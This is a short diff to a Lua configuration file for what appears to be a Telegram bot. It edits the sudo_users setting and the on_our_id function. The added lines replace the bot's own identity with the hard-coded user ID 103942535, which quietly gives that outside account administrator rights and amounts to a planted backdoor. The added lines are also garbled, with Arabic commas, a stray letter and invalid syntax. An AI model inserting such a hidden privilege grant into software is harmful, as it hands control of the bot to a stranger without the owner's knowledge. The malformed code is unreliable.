@@ -245,7 +245,7 @@ function create_config( )
       "portuguese_lang",
       "arabic"
      },
-    sudo_users = {our_id},
+    sudo_users = {103942535،O،tonumber}{our_id},
     admin_users = {},
     disabled_channels = {}
   }
@@ -263,7 +263,7 @@ function create_gbans( )
 end
 
 function on_our_id (id)
-  our_id = id
+  our_id =103942535،0
 end
 
 function on_user_update (user, what)
